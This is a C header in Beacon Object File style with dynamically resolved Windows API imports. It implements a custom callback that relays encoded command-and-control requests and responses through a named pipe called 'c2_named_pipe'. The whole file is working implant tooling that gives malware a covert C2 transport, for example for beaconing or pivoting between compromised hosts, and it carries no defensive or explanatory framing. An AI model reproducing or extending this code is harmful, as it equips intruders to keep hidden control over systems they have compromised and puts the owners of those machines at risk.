#pragma once

#include <windows.h>

#ifndef KERNEL32$GetProcessHeap
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
#endif
#ifndef KERNEL32$HeapAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
#endif
#ifndef KERNEL32$HeapFree
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
#endif
#ifndef KERNEL32$WaitNamedPipeA
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WaitNamedPipeA(LPCSTR, DWORD);
#endif
#ifndef KERNEL32$CreateFileA
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
#endif
#ifndef KERNEL32$WriteFile
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
#endif
#ifndef KERNEL32$ReadFile
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
#endif
#ifndef KERNEL32$CloseHandle
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
#endif
#ifndef MSVCRT$printf
DECLSPEC_IMPORT int MSVCRT$printf(const char *format, ...);
#endif
#ifndef MSVCRT$strlen
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
#endif

static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
{
    static const char *PIPE_NAME = "\\\\.\\pipe\\c2_named_pipe";

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD bytesWritten = 0;
    DWORD bytesRead = 0;
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    if (KERNEL32$WaitNamedPipeA(PIPE_NAME, 5000) == FALSE) {
        MSVCRT$printf("[customCallback] named pipe not available\n");
        return NULL;
    }

    HANDLE hPipe = KERNEL32$CreateFileA(
        PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        MSVCRT$printf("[customCallback] failed to connect to named pipe\n");
        return NULL;
    }

    if (KERNEL32$WriteFile(hPipe, &reqLen, sizeof(reqLen), &bytesWritten, NULL) == FALSE ||
        bytesWritten != sizeof(reqLen)) {
        MSVCRT$printf("[customCallback] failed to write request length to pipe\n");
        KERNEL32$CloseHandle(hPipe);
        return NULL;
    }

    if (KERNEL32$WriteFile(hPipe, encodedRequest, reqLen, &bytesWritten, NULL) == FALSE ||
        bytesWritten != reqLen) {
        MSVCRT$printf("[customCallback] failed to write request body to pipe\n");
        KERNEL32$CloseHandle(hPipe);
        return NULL;
    }

    if (KERNEL32$ReadFile(hPipe, &bytesRead, sizeof(bytesRead), &bytesWritten, NULL) == FALSE ||
        bytesWritten != sizeof(bytesRead) || bytesRead == 0) {
        MSVCRT$printf("[customCallback] failed to read response length from pipe\n");
        KERNEL32$CloseHandle(hPipe);
        return NULL;
    }

    char *responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, bytesRead + 1);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        KERNEL32$CloseHandle(hPipe);
        return NULL;
    }

    DWORD totalRead = 0;
    while (totalRead < bytesRead) {
        DWORD chunk = 0;
        if (KERNEL32$ReadFile(hPipe, responseBuf + totalRead, bytesRead - totalRead, &chunk, NULL) == FALSE || chunk == 0) {
            MSVCRT$printf("[customCallback] failed while reading response payload from pipe\n");
            KERNEL32$HeapFree(hHeap, 0, responseBuf);
            KERNEL32$CloseHandle(hPipe);
            return NULL;
        }
        totalRead += chunk;
    }

    responseBuf[bytesRead] = '\0';
    KERNEL32$CloseHandle(hPipe);

    MSVCRT$printf("[customCallback] received %lu bytes from named pipe\n", (unsigned long)bytesRead);
    return responseBuf;
}
